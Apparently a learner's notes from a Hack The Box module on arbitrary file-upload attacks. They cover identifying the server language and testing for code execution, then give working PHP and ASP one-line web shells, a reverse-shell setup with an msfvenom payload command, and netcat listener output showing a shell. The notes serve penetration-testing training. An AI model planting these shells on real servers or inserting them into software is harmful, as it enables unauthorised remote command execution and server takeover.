## 1- Absent Validation
When a web app **has no validation filters** on uploads it allows _any_ file type by default.  
This lets an attacker upload web shells or reverse-shell scripts and then run them simply by visiting the uploaded file.
#### Arbitrary File Upload (exercise)

- Example: an **Employee File Manager** accepts drops/clicks and shows file names (including `.php`) with no allowed-types stated.
- File dialog displays **All Files**, indicating _no front-end restrictions_.
- If the back-end also lacks restrictions, arbitrary file upload → full server compromise (RCE).
#### Identifying the Web Framework
Before uploading a malicious script you must know the server-side language (web shell must match it).
Common quick methods:
- Try `http://SERVER/index.php`, `index.asp`, `index.aspx`, etc. — if `index.php` returns the same page, likely **PHP**.
- Fuzz for extensions with tools (e.g., Burp Intruder + web-extensions wordlist).
- Browser extensions like **Wappalyzer** show technologies (PHP, Apache, OS, frameworks).
- Web scanners (Burp/ZAP) can also help.

> `Web Routes` are used to map URLs to web pages, in which case the web page extension may not be shown
#### Vulnerability Identification (test upload)

- Create a minimal script in the identified language to test execution:
```php
<?php echo "Hello HTB"; ?>
```

- Upload `test.php`. If upload succeeds and `Download/View` runs the script and prints `Hello HTB`, then:
    - The **back-end has no file validation**.
    - PHP code executed on server → arbitrary file upload -> RCE possible (upload web shell / reverse shell next).
If source code is shown instead of execution, the server is not treating the file as executable.


---

## 2-  Upload Exploitation
The final exploitation step is uploading a malicious script written in the same language as the web application (web shell or reverse shell). After uploading and visiting its link, you should be able to interact with it and control the back-end server.
#### Web Shells

There are many ready-made web shells that provide features like directory traversal and file transfer. Examples and resources:

- [phpbash](https://github.com/Arrexel/phpbash) a terminal-like PHP web shell.
- SecLists (`/opt/useful/seclists/Web-Shells`) — collection of web shells for many languages.
Download a web shell matching the server language (PHP in this example), upload it via the vulnerable feature, then visit the uploaded file to interact with the shell. Web shells simplify enumeration and further exploitation.
#### Writing Custom Web Shell
When online tools are unavailable, a tiny custom web shell can be written. For PHP:
```php
<?php system($_REQUEST['cmd']); ?>
```
Upload as `shell.php` and execute commands with `?cmd=` (e.g. `?cmd=id`). If using a browser, view source (CTRL+U) to see raw command output without HTML formatting.

For .NET Web Apps , a minimal example:
```asp
<% eval request('cmd') %>
```

>: some servers block functions like `system()` or have WAFs that prevent web shells from working; in those cases advanced bypasses are required.
#### Reverse Shell
To receive a reverse shell, download a reverse-shell script for the app language (e.g., [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)  PHP reverse shell) and edit it with your IP/PORT:
```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```
Start a netcat listener on your machine, upload the script, visit its URL, and you may receive a reverse connection:
```shell
$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Reverse shells are often preferred for interactivity but can fail if outbound connections are blocked or required functions are disabled.
#### Generating Custom Reverse Shell Scripts
Tools such as `msfvenom` can generate reverse-shell payloads in many languages and sometimes include bypass techniques. Example for PHP:
```shell
$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
Payload size: 3033 bytes
```
Upload `reverse.php`, start a listener, visit the file URL, and you may receive a connection:
```shell
$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

 > reverse-shells they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.
